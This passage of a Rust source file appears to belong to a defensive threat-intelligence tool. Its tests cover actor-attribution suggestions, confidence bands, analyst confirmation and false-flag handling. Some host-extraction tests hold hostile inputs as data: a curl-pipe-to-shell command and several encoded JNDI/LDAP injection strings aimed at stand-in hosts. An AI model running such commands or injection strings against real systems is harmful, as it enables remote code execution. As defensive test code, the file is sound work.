            .is_ok_and(|n| (64496..=64511).contains(&n) || (65536..=65551).contains(&n)),
    }
}

/// Unix ms at midnight UTC for `YYYY-MM-DD`.
pub fn date_ms(s: &str) -> Option<i64> {
    let b = s.as_bytes();
    if b.len() != 10
        || b[4] != b'-'
        || b[7] != b'-'
        || !b
            .iter()
            .enumerate()
            .all(|(i, c)| i == 4 || i == 7 || c.is_ascii_digit())
    {
        return None;
    }
    let y: i64 = s[0..4].parse().ok()?;
    let m: i64 = s[5..7].parse().ok()?;
    let d: i64 = s[8..10].parse().ok()?;
    let leap = (y % 4 == 0 && y % 100 != 0) || y % 400 == 0;
    let days_in_month = match m {
        1 | 3 | 5 | 7 | 8 | 10 | 12 => 31,
        4 | 6 | 9 | 11 => 30,
        2 if leap => 29,
        2 => 28,
        _ => return None,
    };
    if d < 1 || d > days_in_month {
        return None;
    }
    // Days from the civil date (H. Hinnant).
    let y = if m <= 2 { y - 1 } else { y };
    let era = y.div_euclid(400);
    let yoe = y - era * 400;
    let mp = (m + 9) % 12;
    let doy = (153 * mp + 2) / 5 + d - 1;
    let doe = yoe * 365 + yoe / 4 - yoe / 100 + doy;
    Some((era * 146_097 + doe - 719_468) * DAY_MS)
}

#[cfg(test)]
mod tests {
    use super::*;

    fn sidecar() -> AttackSidecar {
        serde_json::from_str(include_str!("../../../data/attack/techniques.json")).unwrap()
    }

    fn groups() -> AttackGroups {
        serde_json::from_str(include_str!("../../../data/attack/groups.json")).unwrap()
    }

    fn source(publisher: &str) -> Source {
        Source {
            kind: SourceKind::VendorReport,
            publisher: publisher.into(),
            title: "Example loader wave".into(),
            url: "https://reports.example.com/2026/loader".into(),
            published: "2026-09-01".into(),
            retrieved: Some("2026-10-01".into()),
            sha256: None,
            licence: "Fictional example; no licence needed".into(),
            licence_url: None,
        }
    }

    fn report(id: &str, indicators: Vec<Indicator>, techniques: &[&str]) -> ActorReport {
        ActorReport {
            id: id.into(),
            example: true,
            label: Label {
                kind: LabelKind::Cluster,
                text: format!("EXAMPLE-{}", id.to_uppercase()),
            },
            aliases: vec![],
            sources: vec![source("Example Threat Research (fictional)")],
            techniques: techniques.iter().map(|t| t.to_string()).collect(),
            indicators,
            targeting: ReportTargeting {
                cves: vec!["FOILED-DEMO-0001".into()],
                catalogue_ids: vec![],
            },
            geo: Geo {
                source_countries: vec!["XA".into()],
            },
            notes: String::new(),
        }
    }

    fn ind(kind: IndicatorType, value: &str) -> Indicator {
        Indicator {
            kind,
            value: value.into(),
            source: 0,
        }
    }

    fn subject(techniques: &[&str], indicators: &[(IndicatorType, &str, IocType)]) -> Subject {
        Subject {
            kind: SubjectKind::Campaign,
            id: "cmp_000000000000000000000001".into(),
            tenant_id: "t1".into(),
            seed_attempt_id: "att_1".into(),
            attempt_ids: vec!["att_1".into(), "att_2".into()],
            first_seen: date_ms("2026-10-10").unwrap(),
            techniques: techniques.iter().map(|t| t.to_string()).collect(),
            indicators: indicators
                .iter()
                .enumerate()
                .map(|(i, (k, v, t))| SubjectIndicator {
                    kind: *k,
                    value: normalise(*k, v).unwrap(),
                    ioc_id: format!("ioc_{i}"),
                    ioc_type: *t,
                    // Hashes and URLs here stand for what the attacker sent;
                    // addresses and domains for callbacks the decoy made.
                    observed: !matches!(
                        t,
                        IocType::FileSha256 | IocType::PayloadSha256 | IocType::Url
                    ),
                })
                .collect(),
            asns: BTreeSet::new(),
            cves: BTreeSet::from(["FOILED-DEMO-0001".to_string()]),
            catalogue_ids: BTreeSet::new(),
            sources: BTreeSet::new(),
            countries: BTreeSet::from(["XA".to_string()]),
        }
    }

    fn catalogue(reports: Vec<ActorReport>) -> ActorCatalogue {
        let c = ActorCatalogue::build(Some(&groups()), &sidecar(), reports);
        assert!(c.problems.is_empty(), "{:?}", c.problems);
        c
    }

    #[test]
    fn shipped_groups_sidecar_is_consistent() {
        let g = groups();
        assert!(
            g.problems(&sidecar()).is_empty(),
            "{:?}",
            g.problems(&sidecar())
        );
        assert_eq!(
            g.bundle_sha256,
            include_str!("../../../data/attack/SHA256").trim()
        );
        let c = catalogue(vec![]);
        assert_eq!(c.population, g.population);
        assert_eq!(c.profiles.len(), g.groups.len());
        for p in &c.profiles {
            assert!(wording_problems(&p.label, false).is_empty(), "{}", p.label);
        }
    }

    #[test]
    fn indicator_overlap_gives_a_medium_possible_association_with_report_links() {
        let r = report(
            "cluster-01",
            vec![
                ind(IndicatorType::Domain, "stage2.example.invalid"),
                ind(IndicatorType::Cidr, "192.0.2.0/24"),
            ],
            &["T1190", "T1059.004", "T1105"],
        );
        let cat = catalogue(vec![r]);
        let s = subject(
            &["T1190", "T1059.004", "T1105"],
            &[
                (
                    IndicatorType::Domain,
                    "stage2.example.invalid",
                    IocType::Domain,
                ),
                (IndicatorType::Ip, "192.0.2.80", IocType::Ip),
            ],
        );
        let links = suggest(&cat, &ConfidenceConfig::default(), &[s], &BTreeMap::new());
        assert_eq!(links.len(), 1, "{links:#?}");
        let l = &links[0];
        assert_eq!(l.actor_id, "report:cluster-01");
        assert_eq!(l.band, Band::Medium);
        assert_eq!(l.wording, "possible association");
        assert!(!l.publishable);
        assert!(
            l.statement
                .starts_with("Possible association with EXAMPLE-CLUSTER-01")
        );
        assert!(
            l.statement
                .contains("TTP, infrastructure and targeting overlap")
        );
        assert!(wording_problems(&l.statement, false).is_empty());
        assert_eq!(l.sources[0].url, "https://reports.example.com/2026/loader");
        assert_eq!(l.matched.indicators.len(), 2);
        assert_eq!(l.matched.indicators[1].match_kind, MatchKind::InRange);
        assert!(l.not_counted.iter().any(|n| n.contains("geography")));
        assert!(l.review_queue);
    }

    #[test]
    fn geography_alone_and_asn_alone_give_no_link() {
        let mut r = report(
            "geo-02",
            vec![ind(IndicatorType::Asn, "AS64500")],
            &["T1496.001"],
        );
        r.targeting.cves.clear();
        let cat = catalogue(vec![r]);
        let mut s = subject(&["T1190"], &[]);
        s.asns.insert(64500);
        let links = suggest(&cat, &ConfidenceConfig::default(), &[s], &BTreeMap::new());
        assert!(links.is_empty(), "{links:#?}");
    }

    #[test]
    fn technique_overlap_alone_needs_rare_techniques_and_stays_low() {
        let cat = catalogue(vec![]);
        // Common techniques: too little shared rarity for any link.
        let common = subject(&["T1190", "T1105", "T1059.004"], &[]);
        assert!(
            suggest(
                &cat,
                &ConfidenceConfig::default(),
                &[common],
                &BTreeMap::new()
            )
            .is_empty()
        );
        // A rarer set links a few ATT&CK groups, all low.
        let rare = subject(
            &["T1190", "T1105", "T1059.004", "T1496.001", "T1053.003"],
            &[],
        );
        let links = suggest(
            &cat,
            &ConfidenceConfig::default(),
            &[rare],
            &BTreeMap::new(),
        );
        assert!(!links.is_empty() && links.len() <= MAX_LINKS_PER_SUBJECT);
        for l in &links {
            assert_eq!(l.band, Band::Low, "{}", l.label);
            assert!(l.actor_id.starts_with("attack:G"));
            assert!(l.statement.contains("TTP"));
            assert!(!l.statement.contains("infrastructure"));
            assert!(wording_problems(&l.statement, false).is_empty());
        }
    }

    #[test]
    fn decisions_confirm_reject_and_gate_exports() {
        let r = report(
            "cluster-01",
            vec![ind(IndicatorType::Sha256, &"ab".repeat(32))],
            &["T1190"],
        );
        let cat = catalogue(vec![r]);
        let s = subject(
            &["T1190"],
            &[(IndicatorType::Sha256, &"AB".repeat(32), IocType::FileSha256)],
        );
        let cfg = ConfidenceConfig::default();
        let pending = suggest(&cat, &cfg, std::slice::from_ref(&s), &BTreeMap::new());
        assert_eq!(pending.len(), 1);
        assert!(pending[0].statement.contains("tooling"));
        assert!(
            export_links(&pending).is_empty(),
            "pending links never export"
        );

        let mut d = BTreeMap::new();
        let o = |f, attempts: &[&str]| ActorDecision {
            subject_id: s.id.clone(),
            actor_id: "report:cluster-01".into(),
            decision: Override {
                feedback: f,
                analyst_id: "lead".into(),
                at: 1,
                note: "same loader hash as the report".into(),
            },
            attempt_ids: attempts.iter().map(|a| a.to_string()).collect(),
        };
        d.insert(
            (s.id.clone(), "report:cluster-01".to_string()),
            o(Feedback::TruePositive, &["att_1", "att_2"]),
        );
        let confirmed = suggest(&cat, &cfg, std::slice::from_ref(&s), &d);
        let l = &confirmed[0];
        assert_eq!(
            (l.status, l.band, l.wording.as_str()),
            (LinkStatus::Confirmed, Band::High, "confirmed association")
        );
        assert!(l.publishable && !l.review_queue);
        assert!(l.statement.starts_with("Confirmed association"));
        assert!(wording_problems(&l.statement, true).is_empty());
        let ex = export_links(&confirmed);
        assert_eq!(ex.len(), 2, "one link per member attempt");
        assert_eq!(ex["att_2"][0].attempt_id, "att_2");
        assert_eq!(ex["att_2"][0].kind, LinkKind::AttemptActor);

        // An attempt joins the campaign after the confirmation: it is not
        // covered, never exports as confirmed, and puts the link back in the
        // review queue.
        let mut grown = s.clone();
        grown.attempt_ids.push("att_3".into());
        let l = &suggest(&cat, &cfg, std::slice::from_ref(&grown), &d)[0];
        assert_eq!(l.status, LinkStatus::Confirmed);
        assert_eq!(l.confirmed_attempt_ids, ["att_1", "att_2"]);
        assert_eq!(l.new_since_confirmation, ["att_3"]);
        assert!(l.review_queue, "new members since confirmation");
        assert!(
            l.statement
                .ends_with("1 attempt(s) joined since the confirmation and are not covered by it.")
        );
        let ex = export_links(std::slice::from_ref(l));
        assert!(ex.contains_key("att_1") && ex.contains_key("att_2"));
        assert!(!ex.contains_key("att_3"), "later members are not confirmed");
        // A confirmation recorded with no attempts covers none.
        d.insert(
            (s.id.clone(), "report:cluster-01".to_string()),
            o(Feedback::TruePositive, &[]),
        );
        let l = &suggest(&cat, &cfg, std::slice::from_ref(&s), &d)[0];
        assert!(export_links(std::slice::from_ref(l)).is_empty());

        d.insert(
            (s.id.clone(), "report:cluster-01".to_string()),
            o(Feedback::FalsePositive, &["att_1", "att_2"]),
        );
        let rejected = suggest(&cat, &cfg, &[s], &d);
        assert_eq!(rejected[0].status, LinkStatus::Rejected);
        assert_eq!(rejected[0].score, 0);
        assert!(export_links(&rejected).is_empty());
    }

    #[test]
    fn a_shared_asn_never_counts_as_a_shared_indicator() {
        // Rare techniques pass the TTP-only gate; the ASN and the targeting
        // must not lift the link to medium (25 + 5 + 10 would be 40).
        let mut r = report(
            "asn-03",
            vec![ind(IndicatorType::Asn, "AS64500")],
            &["T1190", "T1105", "T1059.004", "T1496.001", "T1053.003"],
        );
        r.targeting.catalogue_ids.clear();
        let cat = catalogue(vec![r]);
        let mut s = subject(
            &["T1190", "T1105", "T1059.004", "T1496.001", "T1053.003"],
            &[],
        );
        s.asns.insert(64500);
        let links = suggest(&cat, &ConfidenceConfig::default(), &[s], &BTreeMap::new());
        let l = links
            .iter()
            .find(|l| l.actor_id == "report:asn-03")
            .expect("TTP gate passes");
        assert_eq!(l.band, Band::Low, "{}", l.score);
        assert!(l.score < 40);
        let sources: Vec<EvidenceSource> = l.confidence.evidence.iter().map(|e| e.source).collect();
        assert!(sources.contains(&EvidenceSource::ActorAsnOverlap));
        assert!(!sources.contains(&EvidenceSource::ActorIndicatorOverlap));
        assert!(
            l.confidence
                .caps_applied
                .iter()
                .any(|c| c.contains("without a shared indicator"))
        );
    }

    #[test]
    fn attacker_chosen_values_cannot_make_a_false_flag_medium() {
        let hash = "cd".repeat(32);
        let r = report(
            "cluster-01",
            vec![
                ind(IndicatorType::Url, "http://stage2.example.invalid/m.sh"),
                ind(IndicatorType::Sha256, &hash),
                ind(IndicatorType::Domain, "c2.example.invalid"),
            ],
            &["T1190", "T1059.004", "T1105"],
        );
        let cat = catalogue(vec![r]);
        let cfg = ConfidenceConfig::default();
        // A false flag: the attacker copies the report's techniques, puts its
        // stage-2 URL in the request and sends its loader.
        let planted = subject(
            &["T1190", "T1059.004", "T1105"],
            &[
                (
                    IndicatorType::Url,
                    "http://stage2.example.invalid/m.sh",
                    IocType::Url,
                ),
                (IndicatorType::Sha256, &hash, IocType::FileSha256),
            ],
        );
        let l = &suggest(&cat, &cfg, &[planted], &BTreeMap::new())[0];
        assert_eq!(l.band, Band::Low, "{}", l.score);
        assert!(l.matched.indicators.iter().all(|i| !i.observed));
        assert!(l.statement.contains("request content"));
        assert!(!l.statement.contains("infrastructure"));
        assert!(l.not_counted.iter().any(|n| n.contains("false flag")));
        // The decoy then calls back to infrastructure the report lists: that
        // the defender observed, so it counts.
        let observed = subject(
            &["T1190", "T1059.004", "T1105"],
            &[
                (
                    IndicatorType::Url,
                    "http://stage2.example.invalid/m.sh",
                    IocType::Url,
                ),
                (IndicatorType::Sha256, &hash, IocType::FileSha256),
                (IndicatorType::Domain, "c2.example.invalid", IocType::Domain),
            ],
        );
        let l = &suggest(&cat, &cfg, &[observed], &BTreeMap::new())[0];
        assert_eq!(l.band, Band::Medium, "{}", l.score);
        assert!(l.statement.contains("infrastructure"));
    }

    fn sent(texts: &[&str]) -> Sent {
        let mut names = BTreeSet::new();
        for t in texts {
            host_tokens(&normalise_sent(t), &mut names);
        }
        Sent {
            names,
            directed: BTreeSet::new(),
        }
    }

    #[test]
    fn named_hosts_match_whole_tokens_only() {
        let s = sent(&[
            "curl -s http://11.2.3.45/x | sh",
            "${jndi:ldap://evil.example.invalid:1389/a}",
        ]);
        assert!(s.chose("11.2.3.45"));
        assert!(!s.chose("1.2.3.4"), "no match inside a longer address");
        assert!(!s.chose("1.2.3.45"));
        assert!(s.chose("evil.example.invalid"));
        assert!(
            s.chose("x.evil.example.invalid"),
            "a lookup under a named domain"
        );
        assert!(!s.chose("example.invalid"), "a parent was not named");
        assert!(!s.chose("notevil.example.invalid"));
        let v6 = sent(&["http://[2001:db8::7]:8080/a"]);
        assert!(v6.chose("2001:db8::7"));
    }

    #[test]
    fn cheap_encodings_are_undone_before_matching() {
        for t in [
            "%24%7Bjndi%3Aldap%3A%2F%2Fevil.example.invalid%2Fa%7D",
            "%2524%257Bjndi%253Aldap%253A%252F%252Fevil.example.invalid%257D",
            "${jndi:ldap://\\u0065vil.example.invalid/a}",
            "${jndi:ldap://\u{FF45}\u{FF56}\u{FF49}\u{FF4C}\u{FF0E}example.invalid/a}",
            "${jndi:ldap://EVIL.Example.INVALID/a}",
            "evil\u{3002}example\u{3002}invalid",
        ] {
            let s = sent(&[t]);
            assert!(s.chose("evil.example.invalid"), "{t}");
        }
    }

    #[test]
    fn report_titles_are_never_quoted_and_publishers_are_checked() {
        let mut r = report(
            "cluster-01",
            vec![ind(IndicatorType::Domain, "c2.example.invalid")],
            &["T1190"],
        );
        r.sources[0].title = "Loader wave attributed to EXAMPLE state actor".into();
        let cat = catalogue(vec![r.clone()]);
        let s = subject(
            &["T1190"],
            &[(IndicatorType::Domain, "c2.example.invalid", IocType::Domain)],
        );
        let l = &suggest(&cat, &ConfidenceConfig::default(), &[s], &BTreeMap::new())[0];
        assert!(
            wording_problems(&l.statement, false).is_empty(),
            "{}",
            l.statement
        );
        for e in &l.confidence.evidence {
            assert!(
                wording_problems(&e.summary, false).is_empty(),
                "{}",
                e.summary
            );
        }
        assert_eq!(l.sources[0].title, r.sources[0].title, "kept as data");
        r.sources[0].publisher = "Group responsible for it (fictional)".into();
        r.aliases = vec!["the crew that is behind it".into()];
        let p = r.problems(&sidecar().known_ids()).join("\n");
        assert!(p.contains("publisher") && p.contains("alias"), "{p}");
    }

    #[test]
    fn stale_indicators_count_half() {
        let mut r = report(
            "cluster-01",
            vec![ind(IndicatorType::Ip, "198.51.100.7")],
            &[],
        );
        r.sources[0].published = "2020-01-01".into();
        r.sources[0].retrieved = Some("2020-01-02".into());
        let cat = catalogue(vec![r]);
        let s = subject(&[], &[(IndicatorType::Ip, "198.51.100.7", IocType::Ip)]);
        let l = &suggest(&cat, &ConfidenceConfig::default(), &[s], &BTreeMap::new())[0];
        assert!(l.matched.indicators[0].stale);
        assert_eq!(l.matched.indicators[0].weight, 35);
    }

    #[test]
    fn report_rules_enforce_cautious_labels_and_pins() {
        let known = sidecar().known_ids();
        let mut r = report(
            "cluster-01",
            vec![ind(IndicatorType::Ip, "8.8.8.8")],
            &["T9999"],
        );
        r.label.kind = LabelKind::NamedGroup;
        r.label.text = "EXAMPLE group attributed to a state".into();
        r.notes = "Confirmed by us.".into();
        let p = r.problems(&known).join("\n");
        assert!(p.contains("attributed to"), "{p}");
        assert!(p.contains("two publishers"), "{p}");
        assert!(p.contains("T9999"), "{p}");
        assert!(p.contains("documentation addresses"), "{p}");
        assert!(p.contains("needs an analyst"), "{p}");

        let mut real = report("real-01", vec![], &["T1190"]);
        real.example = false;
        real.label.text = "UNC0000".into();
        let p = real.problems(&known).join("\n");
        assert!(p.contains("sha256"), "{p}");
        assert!(p.contains("reserved example domains"), "{p}");
    }

    #[test]
    fn values_normalise_and_ranges_match() {
        assert_eq!(
            normalise(IndicatorType::Domain, "Stage2.Example.INVALID."),
            Some("stage2.example.invalid".into())
        );
        assert_eq!(
            normalise(IndicatorType::Url, "HTTP://Stage2.example.invalid/M.sh"),
            Some("http://stage2.example.invalid/M.sh".into())
        );
        assert_eq!(
            normalise(IndicatorType::Asn, "AS64500"),
            Some("64500".into())
        );
        assert_eq!(
            normalise(IndicatorType::Cidr, "10.0.0.0/4"),
            None,
            "too wide"
        );
        let (net, len) = parse_cidr("203.0.113.0/24").unwrap();
        assert!(in_cidr("203.0.113.9".parse().unwrap(), net, len));
        assert!(!in_cidr("203.0.114.9".parse().unwrap(), net, len));
        assert_eq!(date_ms("1970-01-02"), Some(DAY_MS));
        assert_eq!(date_ms("2026-02-29"), None);
        assert!(valid_actor_id("attack:G0096") && valid_actor_id("report:example-cluster-01"));
        assert!(!valid_actor_id("report:../x") && !valid_actor_id("G0096"));
        let id = link_id("t1", "cmp_x", "attack:G0096");
        assert!(valid_link_id(&id));
        assert_ne!(id, link_id("t2", "cmp_x", "attack:G0096"));
    }

    #[test]
    fn statements_never_claim_attribution() {
        let src = vec![source("Example Threat Research (fictional)")];
        for st in [LinkStatus::Pending, LinkStatus::Rejected] {
            let s = statement("EXAMPLE-CLUSTER-01", st, &["TTP"], &src);
            assert!(wording_problems(&s, false).is_empty(), "{s}");
        }
        let s = statement("EXAMPLE-CLUSTER-01", LinkStatus::Confirmed, &["TTP"], &src);
        assert!(!wording_problems(&s, false).is_empty());
        assert!(wording_problems(&s, true).is_empty());
        assert!(!wording_problems("APT-X is behind this", true).is_empty());
    }
}
